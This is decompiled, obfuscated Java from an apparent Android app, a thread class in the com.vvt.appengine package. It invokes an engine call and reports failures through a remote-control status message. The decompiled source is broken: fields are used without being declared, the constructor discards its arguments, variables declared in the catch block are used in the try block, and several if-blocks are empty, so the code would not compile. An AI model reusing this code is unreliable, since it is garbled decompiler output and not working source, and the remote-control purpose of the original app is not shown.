package com.vvt.appengine.a;

import android.os.ConditionVariable;
import android.os.Looper;
import android.os.SystemClock;
import com.vvt.a.a;
import com.vvt.a.c;
import com.vvt.appengine.AppEngine1;
import com.vvt.m.b;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class r
  extends Thread
{
  r(q paramq, String paramString1, String paramString2, int paramInt)
  {
    super(paramString1);
  }
  
  public void run()
  {
    
    try
    {
      Object localObject1 = this.c;
      localObject1 = q.a((q)localObject1);
      localObject1 = ((AppEngine1)localObject1).S;
      if (localObject1 == null)
      {
        boolean bool1 = q.a();
        if (!bool1) {}
      }
      localObject1 = this.c;
      localObject1 = q.a((q)localObject1);
      localObject1 = ((AppEngine1)localObject1).S;
      localObject3 = b.c;
      str = this.a;
      int i = this.b;
      Object localObject4 = this.c;
      localObject4 = ((q)localObject4).a;
      ((a)localObject1).a((String)localObject3, str, i, (c)localObject4);
      localObject1 = this.c;
      localObject3 = Looper.myLooper();
      q.a((q)localObject1, (Looper)localObject3);
      Looper.loop();
      return;
    }
    catch (IllegalStateException localIllegalStateException)
    {
      for (;;)
      {
        boolean bool2 = q.a();
        if (bool2) {}
        Object localObject3 = q.b(this.c);
        String str = null;
        ((RmtCtrlOutputStatusMessage)localObject3).setSuccess(false);
        localObject3 = q.b(this.c);
        Object localObject2 = localIllegalStateException.toString();
        ((RmtCtrlOutputStatusMessage)localObject3).setMessage((String)localObject2);
        localObject2 = q.c(this.c);
        if (localObject2 != null)
        {
          long l = 10;
          SystemClock.sleep(l);
          localObject2 = q.c(this.c);
          ((ConditionVariable)localObject2).open();
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/r.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */